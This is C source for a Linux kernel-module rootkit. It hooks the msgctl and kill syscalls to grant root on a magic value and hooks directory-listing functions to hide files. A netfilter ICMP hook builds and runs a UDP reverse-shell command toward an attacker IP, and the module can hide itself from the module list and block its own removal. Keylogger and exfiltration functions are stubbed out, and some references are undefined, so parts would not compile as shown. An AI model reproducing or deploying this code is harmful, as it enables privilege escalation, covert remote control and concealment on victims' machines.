/**
 * @file    rootkit.c
 * @author  Aaron Lichtman
 * @brief   A rootkit. // TODO: Expand description
 */
#include <asm/unistd.h>
#include <asm/errno.h>
#include <linux/cred.h>
#include <linux/delay.h>
#include <linux/fs.h>
#include <linux/icmp.h>
#include <linux/inet.h>
#include <linux/init.h>
#include <linux/ipc.h>
#include <linux/ip.h>
#include <linux/jiffies.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/net.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/signal.h>
#include <linux/skbuff.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/threads.h>
#include <linux/timer.h>
#include <linux/types.h>
#include <linux/udp.h>
#include <linux/unistd.h>
#include <linux/workqueue.h>
#include <linux/version.h>
#include <net/inet_sock.h>
#include "khook/engine.c"

MODULE_AUTHOR("Aaron Lichtman");
MODULE_DESCRIPTION("Linux rootkit.");
MODULE_VERSION("0.1");
MODULE_LICENSE("GPL");  // So the kernel doesn't complain about proprietary code

/**
 * Data structures
 */

#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
typedef struct legacy_timer_emu {
	struct timer_list t;
	void (*function)(unsigned long);
	unsigned long data;
} _timer;
#else
typedef struct timer_list _timer;
#endif

typedef struct shell_command_task {
	struct work_struct work;
	char* command;
} shell_command_task;

// TODO: Extract this to an h file to avoid duplication.
#define GET_ROOT 0
#define KEYLOGGER_ENABLE 1
#define KEYLOGGER_DISABLE 2
#define FILE_HIDE_ADD 3
#define FILE_HIDE_RM 4
#define FILE_HIDE_SHOW 5

// This task_from_controller struct is what is actually passed to the LKM.
typedef struct task_from_controller {
	int func_code;
	char* file_hide_str;
} task_from_controller;

/**
 * Global defines and variables.
 */

#define POLLING_INTERVAL 1500
#define MAGIC_ROOT_NUM 31337
#define MAX_TASK_SIZE 200

static _timer polling_timer;
static struct nf_hook_ops icmp_hook;
static __be32 attacker_ip = 0;
struct workqueue_struct* shell_work_queue;

// Module parameters

static bool block_removal = false;
module_param(block_removal, bool, 0660);
MODULE_PARM_DESC(block_removal, "Toggle for blocking removal of rootkit.");
static char* rev_shell_ip = NULL;
module_param(rev_shell_ip, charp, 0660);
MODULE_PARM_DESC(rev_shell_ip, "IP Address for reverse shell.");
static char* rev_shell_port = NULL;
module_param(rev_shell_port, charp, 0660);
MODULE_PARM_DESC(rev_shell_ip, "Port for reverse shell.");
// TODO: Convert to array of strings.
static char* hidden_file_prefix = NULL;
module_param(hidden_file_prefix, charp, 0660);
MODULE_PARM_DESC(hidden_file_prefix, "Prefix for hidden files.");
static bool keylogger = false;
module_param(keylogger, bool, 0660);
MODULE_PARM_DESC(keylogger, "Toggle for keylogger.");

/**
 * Forward declarations
 */

static int get_root(void);
static void do_something_on_interval(unsigned long data);

/**
 * Logging Helpers
 * // TODO: Fix
 */

void log_info(const char* message) {
	printk(KERN_INFO "GARDEN: %s", message);
}

void log_error(const char* message) {
	printk(KERN_ERR "GARDEN: %s", message);
}

/**
 * Handler for incoming task_from_controllers. Frees task memory if it doesn't return.
 */
int handle_task(task_from_controller* task) {
	printk(KERN_EMERG "Handling function code: %d\n", task->func_code);

	switch (task->func_code) {
	case GET_ROOT:
		return get_root();

	case KEYLOGGER_ENABLE:
		// TODO
		break;

	case KEYLOGGER_DISABLE:
		// TODO
		break;

	case FILE_HIDE_ADD:
		// TODO
		break;

	case FILE_HIDE_RM:
		// TODO
		break;

	case FILE_HIDE_SHOW:
		// TODO: print contents of hidden_file_prefix array
		break;

	default:
		printk(KERN_ERR "Unexpected function code. This shouldn't be possible.\n");
		return -1;
	};

	return 0;
}

/**
 * Hook for communication with kernel from user program. If the first two arguments
 * are INT_MAX, then the third argument is a pointer to an action task_ struct.
 * Copy that from userspace and process it.
 */
KHOOK_EXT(long, __x64_sys_msgctl, const struct pt_regs*);
static long khook___x64_sys_msgctl(const struct pt_regs* regs) {
	task_from_controller* task;
	int error;

	if (regs->di == INT_MAX && regs->si == INT_MAX) {
		printk(KERN_EMERG "sys_msgctl --Incoming command\n");
		task = kmalloc(MAX_TASK_SIZE + 1, GFP_KERNEL);
		copy_from_user(task, (const void*)regs->dx, MAX_TASK_SIZE);
		error = handle_task(task);
		kfree(task);
		return error;
	} else {
		return KHOOK_ORIGIN(__x64_sys_msgctl, regs);
	}
}

/**
 * Hide files and directories.
 * Adapted from: https://github.com/f0rb1dd3n/Reptile/blob/0e562cffc4373d6774502a2f68fd758f58a2db75/rep_mod.c#L619
 */

/**
 * If this method returns true, the file in question should be hidden.
 */
static bool should_hide_file(const char* name) {
	if (hidden_file_prefix && !strncmp(name, hidden_file_prefix, strlen(hidden_file_prefix))) {
		printk(KERN_INFO "Hiding: %s\n", name);
		return true;
	}

	return false;
}

KHOOK_EXT(int, fillonedir, void*, const char*, int, loff_t, u64, unsigned int);
static int khook_fillonedir(void* __buf, const char* name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
	if (should_hide_file(name)) {
		return 0;
	}

	return KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
}

KHOOK_EXT(int, filldir, void*, const char*, int, loff_t, u64, unsigned int);
static int khook_filldir(void* __buf, const char* name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
	if (should_hide_file(name)) {
		return 0;
	}

	return KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
}

KHOOK_EXT(int, filldir64, void*, const char*, int, loff_t, u64, unsigned int);
static int khook_filldir64(void* __buf, const char* name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
	if (should_hide_file(name)) {
		return 0;
	}

	return KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
}

KHOOK_EXT(int, compat_fillonedir, void*, const char*, int, loff_t, u64, unsigned int);
static int khook_compat_fillonedir(void* __buf, const char* name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
	if (should_hide_file(name)) {
		return 0;
	}

	return KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
}

KHOOK_EXT(int, compat_filldir, void*, const char*, int, loff_t, u64, unsigned int);
static int khook_compat_filldir(void* __buf, const char* name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
	if (should_hide_file(name)) {
		return 0;
	}

	return KHOOK_ORIGIN(compat_filldir, __buf, name, namlen, offset, ino, d_type);
}

KHOOK_EXT(struct dentry*, __d_lookup, const struct dentry*, const struct qstr*);
struct dentry* khook___d_lookup(const struct dentry* parent, const struct qstr* name) {
	if (should_hide_file(name->name)) {
		return NULL;
	}

	return KHOOK_ORIGIN(__d_lookup, parent, name);
}

/**
 * Drops the current user into a root shell.
 */
static int get_root(void) {
	struct cred* root_creds;
	printk(KERN_EMERG "One root coming right up.");
	root_creds = prepare_kernel_cred(NULL);
	return commit_creds(root_creds);
}

KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs*);
static long khook___x64_sys_kill(const struct pt_regs* regs) {
	if (regs->di == MAGIC_ROOT_NUM) {
		return get_root();
	}

	return KHOOK_ORIGIN(__x64_sys_kill, regs);
}

/**
 * Timer and Command Polling Functions
 * Adapted from: https://github.com/aircrack-ng/rtl8812au/commit/f221a169f281dab9756a176ec2abd91e0eba7d19
 */

#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
static void legacy_timer_function_wrapper(struct timer_list* timer) {
	struct legacy_timer_emu* legacy_timer = from_timer(legacy_timer, timer, t);
	// NOTE: legacy_timer->data is currently always NULL, but may not be in the future.
	legacy_timer->function(legacy_timer->data);
}
#endif

__inline void timer_init_wrapper(_timer* timer, void* func) {
	timer->data = 0;
	timer->function = func;
#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
	timer_setup(&timer->t, legacy_timer_function_wrapper, 0);
#else
	init_timer(timer);
#endif
}

__inline static void set_timer(_timer* timer) {
	unsigned long expires = jiffies + msecs_to_jiffies(POLLING_INTERVAL);
#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
	mod_timer(&timer->t, expires);
#else
	mod_timer(timer, expires);
#endif
	// printk("Timer configured to go off at %lu jiffies, in %lu msecs\n", expires, msecs_to_jiffies(POLLING_INTERVAL));
}

__inline static void timer_cleanup_wrapper(_timer* timer) {
#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
	del_timer_sync(&timer->t);
#else
	del_timer_sync(timer);
#endif
}

/**
 * Do something on an interval, and then start a timer to call this
 * function again in the future.
 * NOTE: The data parameter is required in order for this to compile.
 */
static void do_something_on_interval(unsigned long data) {
	// TODO: Exfiltrate data.
	set_timer(&polling_timer);
}

/**
 * Work queue function
 */
int add_shell_task_to_queue(char* path, char* ip, char* port) {
	struct shell_command_task* task;
	task = kmalloc(sizeof(*shell_command_task), GFP_KERNEL);

	if (!task) {
		return -1;
	}

	INIT_WORK(&task->work, &run_shell_command);
	task->command = create_reverse_shell_cmd();
	return queue_work(work_queue, &task->work);
}

/**
 * This function allows the kernel to call out to userspace and execute
 * code there. We define the environment the command will execute in and
 * run it. Control is not returned to the kernel after this particular
 * thread of execution is completed.
 *
 * In this rootkit, we will primarily use this function to spawn a
 * reverse shell.
 */
int run_shell_command(char* run_cmd) {
	struct subprocess_info* info;
	static char* envp[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/usr/sbin:/bin:/usr/bin",
		NULL
	};

	char** argv = kmalloc(sizeof(char* [5]), GFP_KERNEL);

	if (!argv) {
		return -ENOMEM;
	}

	argv[0] = "/bin/sh";
	argv[1] = "-c";
	argv[2] = run_cmd;
	argv[3] = NULL;

	return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

/**
 * Builds the command: $ echo "sh -i >& /dev/udp/IP/PORT 0>1&" | bash
 *
 * This command is responsible for opening a reverse shell.
 */
char* create_reverse_shell_cmd(void) {
	// Prepare to assemble string
	char* beginning, *ending, *cmd;
	int max_ip_port_len;
	max_ip_port_len = 16 + 5 + 1; // 16 chars for IP, 5 for port, 1 for /
	beginning = "echo 'sh -i >& /dev/udp/";
	ending = " 0>1&' | bash";

	// Put it all together
	cmd = kcalloc(1, strlen(beginning) + strlen(ending) + max_ip_port_len + 1, GFP_KERNEL);
	strncat(cmd, beginning, strlen(beginning));
	strncat(cmd, rev_shell_ip, strlen(rev_shell_ip));
	strncat(cmd, "/", 1);
	strncat(cmd, rev_shell_port, strlen(rev_shell_port));
	strncat(cmd, ending, strlen(ending));
	return cmd;
}

/**
 * Net filter hook option for intercepting magic packets to
 * look for reverse shell requests. This tutorial was incredibly helpful
 * as I was putting this together: https://www.drkns.net/kernel-who-does-magic/
 **/
unsigned int icmp_hook_func(const struct nf_hook_ops* ops,
                            struct sk_buff* socket_buff,
                            const struct net_device* net_dev_in,
                            const struct net_device* net_dev_out,
                            int (*okfn)(struct sk_buff*)) {
	struct iphdr* ip_header;

	printk(KERN_EMERG "ICMP HOOK hit");

	if (!socket_buff) {
		goto accept;
	}

	ip_header = ip_hdr(socket_buff);

	if (!ip_header) {
		goto accept;
	}

	// If it's an ICMP packet coming from the IP address entered during
	// config, we should open a reverse shell.
	if (ip_header->protocol == IPPROTO_ICMP) {
		printk(KERN_INFO "ICMP from %pI4 to %pI4\n", &ip_header->saddr, &ip_header->daddr);

		if (attacker_ip == ip_header->saddr) {
			char* cmd;
			printk(KERN_EMERG "Reverse shell request found!\n");
			cmd = create_reverse_shell_cmd();
			printk(KERN_INFO "Running: %s", cmd);
			run_command(cmd);
		}
	}

accept:
	return NF_ACCEPT;
}

static void icmp_hook_init(void) {
	icmp_hook.hook = (void*) icmp_hook_func;
	icmp_hook.pf = PF_INET; // Filter by IPV4 protocol family.
	icmp_hook.hooknum = NF_INET_PRE_ROUTING;
	icmp_hook.priority = NF_IP_PRI_FIRST; // See packets before every other hook function

	if (nf_register_net_hook(&init_net, &icmp_hook)) {
		printk(KERN_ERR "There was an issue registering ICMP hook.\n");
	} else {
		printk(KERN_ERR "Registered ICMP hook.\n");
	}
}

/**
 * Rootkit module initialization.
 */
static int __init rootkit_init(void) {
	printk(KERN_EMERG "Initializing rootkit...\n");
	khook_init();

	printk(KERN_EMERG "Initializing ICMP hook...\n");
	icmp_hook_init();

	// If reverse shell IP input, convert it to a numeric representation
	// for comparison in the hook.
	if (rev_shell_ip) {
		attacker_ip = in_aton(rev_shell_ip);
	}

	printk(KERN_EMERG "Initializing timer...\n");
	timer_init_wrapper(&polling_timer, do_something_on_interval);
	set_timer(&polling_timer);

	if (block_removal) {
		printk(KERN_EMERG "Blocking removal and hiding rootkit...\n");
		list_del_init(&__this_module.list);
		kobject_del(&THIS_MODULE->mkobj.kobj);
	}

	// Gotta make the compiler happy.
	do_something_on_interval(0);
	return 0;
}

/**
 * Called when $ rmmod is executed. Cleans up rootkit nicely.
 */
static void __exit rootkit_exit(void) {
	printk(KERN_EMERG "rmmod called. Cleaning up rootkit.");
	khook_cleanup();
	nf_unregister_net_hook(&init_net, &icmp_hook);
	timer_cleanup_wrapper(&polling_timer);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
